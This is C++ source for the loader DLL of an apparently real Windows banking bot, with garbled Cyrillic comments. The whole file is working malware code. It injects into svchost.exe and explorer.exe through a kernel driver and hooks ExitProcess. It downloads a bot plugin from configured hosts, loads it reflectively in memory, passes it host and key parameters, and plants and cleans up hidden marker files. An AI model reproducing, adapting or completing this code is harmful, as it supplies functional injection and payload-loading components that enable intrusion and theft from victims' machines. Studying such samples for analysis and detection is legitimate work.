
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

#include "DbgRpt.h"



//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>


void DbgRptSvchostThread(void* Arguments)
{
	LDRDBG("DbgRptSvchostThread", "Sleeping before network started (3 min)...");
	pSleep(3 * 60 * 1000);

	for(;;)
	{
		LDRDBG("DbgRptSvchostThread", "Notify debug report...");

		// 304_ld ���������� ������ � Svchost (������ 3 ������)
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("304_ld"));

		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());

		pSleep(3 * 60 * 1000);
	}
}

void DbgRptExplorerThread(void* Arguments)
{
	for(;;)
	{
		LDRDBG("DbgRptExplorerThread", "Notify debug report...");

		// 305_ld ���������� ������ � Explorer (������ 3 ������)
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));

		pSleep(3 * 60 * 1000);
	}
}


//----------------------------------------------------------------------------

PWCHAR SVChostName = L"svchost.exe";
char   BotPluginName[] =  "bktestmb.plug";

namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

	HANDLE ThreadHandle = NULL; // ����� ����������� ������

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// ������� ���������� ��� ����������� �����


		// ���������� ��������� ����
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
		
		PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// ������ ����� ���
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// ������� ��������� �������, ����
		// ������� ����� �������� �������, �� ���������� ��� ����������
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// ������� ������� ������� ����������

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

//	PCHAR GetBotPlugCacheFileName()
//	{
//		// ������� ���������� ��� ����� ���� �������
//		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
//		return BOT::GetWorkPathInSysDrive(NULL, Name);
//	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{
		// ������� �������� �������
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
		
		LDRDBG("BRDS", "��������� �������� �� ��������� svchost.exe ");

		DriverRemoveInjectToProcess(InitData, SVChostName);

		for (;;)
		{
				WSADATA wsa;
				ClearStruct(wsa);
				DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
				
				if (Code == 0) break;

				LDRDBG("BRDS", "pWSAStartup failed.");
				return 0; //pSleep(500);
		}
		
		
		LDRDBG("BRDS", "������ �������� ������� ���� (V 10) ");

		DWORD Size = 0;
		LPVOID Module = NULL;


		//��������� ����������
		LDRDBG("BRDS", "�������������� �������� �������!");

		// 311_ld ������ �������� ����� ����� � ������� � svchost
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));


		Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);

		// 312_ld ��������� �������� ����� ����� � ������� � svchost
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("312_ld"));

		if (Module != NULL)
		{
			// ��������� ������ � ���
			LDRDBG("BRDS", "��� ������� �������� ");
			MemFree(Module);

			// �������� ����������� ��� � �������	
			// ��������� ������ ��� ������� � ������� ���������� �����

			// ���������� ��������� �� �������� �������� ���
			LDRDBG("BRDS", "���������� ��������� ");

			// 313_ld �������� �������� ����� ����� � ������� � svchost
			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("313_ld"));

			WaitExplorer();


			PCHAR Buf = "Ok: ";
			DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
		}

		ThreadHandle = NULL; // ������������� ������ ��� ������ �� ����������

		LDRDBG("BRDS", "DownloadMethod finised.");

		return 0;
	}

	

	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{

		//// 303_ld ������ � Svchost (��� ���� ����� �� ����)
		//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("303_ld"));

		// ��������� ����� �������� ���
		
		//===================================================
		// ���� 1. ��������� ������������� ����������� �����
		// ��� ����� �������� ���� � ������������ �������� �
		// �������� ��� �� �������� ����� ����������� �������
		// ����� ����� ��������� �� �����, ��� ���� ������
		// ������, ��� ������� ����������� �������� ��� �����
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// �������� ������� ���
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
		if (H == INVALID_HANDLE_VALUE)
		{
			// ������ �������� �����, �������, ���
			// � ������ ������ ������ ������� ������ �������
			STR::Free(FileName);
			return false;
		}

		// ��������� �������, ��� ����� ����������� ����������
		// ������� ����
		pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// ���� 2: ������������� ���� ������� �����������
		// ���������� �������� �� ���������� ������ ������
		// ������
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
		//  ���� 3: ��������� �����
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
		}
		pSetThreadPriority(ThreadHandle, THREAD_PRIORITY_NORMAL);

		//===================================================
		//  ���� 4: ��������� ����� � svchost ������� �� �������� ������
		//===================================================
		StartThread(DbgRptSvchostThread, NULL);



		return true;
	}

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// ������� �������� �������� �������
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);

	STR::Free(Buf);
}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{
	// 320_ld ������� �������� � ������� BotPlug
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("320_ld"));


	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);

	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "�� ������� ��������� ��� � ������ ");
		return;
	}

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		// ������������� ��������� ����
		LDRDBG("BRDS Explorer", "������������� ��������� ���� ");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
	}

	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
		LDRDBG("BRDS Explorer", "��� ������� ������� ");
		DLLLoader::DLLLoadedInExplorer = true;
		Method(NULL, NULL, NULL);

		// 321_ld ������� �������� � ������� BotPlug �������
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("321_ld"));
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS Explorer", "��������� ��� ���� ");

	// 310_ld ������� �������� ���� ����� � ���� � Explorer
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("310_ld"));

	if (IsNewProcess(DLLLoader::ExplorerPID))
		DLLLoader::DLLLoadedInExplorer = false;


	if (DLLLoader::DLLLoadedInExplorer)
		return true;


	LDRDBG("BRDS Explorer", "������ ������ �� ����");
	DWORD Size = 0;
	LPBYTE Module = Plugin::DownloadFromCache(BotPluginName, true, NULL, &Size);

	if (Module != NULL)
	{
		// �������������� ����������
		if (DelayBeforeStart != 0)
		pSleep(DelayBeforeStart);

		LDRDBG("BRDS Explorer", "��� ��������� � ������������ ");
		ExplorerLoadDLL(InitData, Module, Size);

		MemFree(Module);
	}


	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	LDRDBG("BRDS", "�������� ������� ����������  ");

	if (Data == NULL) 
	{
		LDRDBG("BRDS Explorer", "��������� ������ ��� ������ � ���������� ");
		return 0;
	}

	// 302_ld ������ � Explorer (��� ���� ����� �� ����)
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("302_ld"));

	// ��������� ����� � svchost ������� �� �������� ������
	StartThread(DbgRptExplorerThread, NULL);

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	LDRDBG("BRDS Explorer", "������� ���� ������� �������� �������� �� ��������� svchost.exe ");
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);


	LDRDBG("BRDS Explorer", "������ ������ ���������� ");

	// ������ ����� �������� ��������� ��� �� �����
	
	if (DoStartBotDll(InitData, 5000))
	{	
		LDRDBG("BRDS Explorer", "��� ������� �������� �� ���� ");
		return 0;
	} 

	// ������������ ������� �������� �����
	LDRDBG("BRDS Explorer", "������������ ����� �������� ����� � �������� Explorer ");
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS Explorer", "������ ����������� ������ �������� ���� ���������� ");
		return 0;
	}

	// ��������� ����������� ���� ��������

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

extern"C" __declspec(dllexport) VOID NTAPI  Start(
							PVOID  NormalContext /*��������� ���������*/,
							PUSER_INIT_NOTIFY  SystemArgument1 /*�������� ������� ����� ��������� ���� ������������ ������� � ���������*/,
							PVOID SystemArgument2/* ������ �� �����������*/)
{
	// �������� ����� �������� ��� 
	if (SystemArgument1 == NULL)
		return;


	// ���������� � ����� �������� ���������
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	LDRDBG("BRDS", "LoaderDll loaded ...");

	//// 301_ld ������ ������ (��� ���� ����� �� ����)
	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{

		PCHAR CL = (PCHAR)pGetCommandLineA();

		LDRDBG("BRDS", "������� ���������� ������ �������� svchost.exe ");
		LDRDBG("BRDS", "��������� ������ svchost.exe - %s ", CL);

		//if (STR::Pos(CL, "localservice", 0, false) >= 0)
		{
			DLLLoader::StartLoaderThread(SystemArgument1);
		}
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// 
		LDRDBG("BRDS", "������� ���������� ������ ���������� ");
		StartThread(ExplorerStartProc, SystemArgument1);
	}
};

void WaitForOldRing3BotSelfRemoved()
{
	DWORD TimeoutInSec = 24 * 60 * 60;
	
	DWORD PeriodInSec = 60;
	DWORD PeriodCount = TimeoutInSec / PeriodInSec;
	PCHAR PathToRing3Bot = BOT::GetBotFullExeName();
	
	while (true)
	{
		bool IsExists = File::IsExists(PathToRing3Bot);
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "check file='%s' exists='%d'",
			PathToRing3Bot, IsExists);

		if(!IsExists) break;
		
		LDRDBG("WaitForOldRing3BotSelfRemoved", "Sleeping %d sec='%s'",
			PeriodInSec);

		// 318_ld �������� �������� �������� ring3 ���� ����� �������������
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("318_ld"));

		pSleep(PeriodInSec * 1000);
		PeriodCount--;

		if (PeriodCount == 0)
		{
			pMoveFileExA(PathToRing3Bot, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
			break;
		}
	}

	STR::Free(PathToRing3Bot);
}

// ����� ��� ������ � �������.
// ����� �� ������������ ��� ������ �� ��������, �����������, ����������� ������ � ��
// � ������ - ������ ������� � Loader_dll � ��� ��� ������ ������� ����, ���� � ���� 
// ��, ��� ��� �����.
// ���������� ����������� ������� � �������.

BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
{
	DWORD Size = 0;
	LPVOID Module = NULL;

	//��������� ����������
	LDRDBG("LoadPlugToCache", "�������� �������� �������!");

	// 315_ld ������ �������� ����� ����� ������� LoadPlugToCache
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));

	Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);

	LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);

	// 316_ld ��������� �������� ����� ����� ������� LoadPlugToCache
	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));

	if (Module != NULL)
	{
		// ��������� ������ � ���
		LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
		
		// 317_ld �������� �������� ����� ����� ������� LoadPlugToCache
		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
		
		MemFree(Module);

		return TRUE;
	}

	return FALSE;
}

void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
{
	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
	
	DWORD DllBodySize;

	LPBYTE DllBody = File::ReadToBufferW((PWCHAR)path, DllBodySize);
	LDRDBG("LoadPlugFromRawFile", "File::ReadToBufferW() return 0x%X", DllBody);

	if (DllBody == NULL) return;

	HMEMORYMODULE Module = MemoryLoadLibrary(DllBody);
	LDRDBG("LoadPlugFromRawFile", "MemoryLoadLibrary() return 0x%X", Module);

	if (Module == NULL) return;

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		// ������������� ��������� ����
		LDRDBG("LoadPlugFromRawFile", "������������� ��������� ���� ");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
	}

	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
		LDRDBG("LoadPlugFromRawFile", "Plug loaded successfuly.");
		Method(NULL, NULL, NULL);
	}
}

#pragma comment(linker, "/ENTRY:LoaderDllMain" )

DWORD WINAPI LoaderDllMain(DWORD, DWORD, DWORD)
{
	// � ������� ��������� ����� � ������ ��������� 
	// ������������ ��������. ������� ������ ���������� TRUE
	//return 0;
	return TRUE;
}
